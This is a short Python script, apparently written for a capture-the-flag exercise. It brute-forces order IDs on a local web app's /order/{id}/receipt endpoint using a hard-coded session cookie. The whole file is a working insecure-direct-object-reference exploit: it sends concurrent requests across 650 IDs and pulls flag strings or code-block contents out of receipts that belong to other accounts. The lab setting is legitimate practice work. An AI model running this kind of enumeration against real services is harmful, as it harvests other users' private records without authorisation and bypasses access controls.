import urllib.request, urllib.error, re, concurrent.futures
base='http://localhost:80'
cookie='session=eyJ1c2VyX2lkIjoxMDAzMn0.aXe3hw.yftY93PHyITcQqZXgmR5P2lLLR8'
headers={'Cookie': cookie}

pattern=re.compile(r'FLAG\{[^}]+\}|CTF\{[^}]+\}', re.I)

ids=range(300000,300650)

results=[]

def fetch(i):
    url=f"{base}/order/{i}/receipt"
    req=urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=4) as resp:
            body=resp.read().decode('utf-8','ignore')
            m=pattern.search(body)
            if m:
                return (i, m.group(0), body[:200])
            # Also capture if the modal shows any non-empty code content
            m2=re.search(r'<code[^>]*>(.*?)</code>', body, re.S)
            if m2 and m2.group(1).strip() and 'Lorem ipsum' not in m2.group(1):
                return (i, 'TEXT', m2.group(1).strip())
    except Exception:
        return None

with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
    for res in ex.map(fetch, ids):
        if res:
            results.append(res)

print(results)
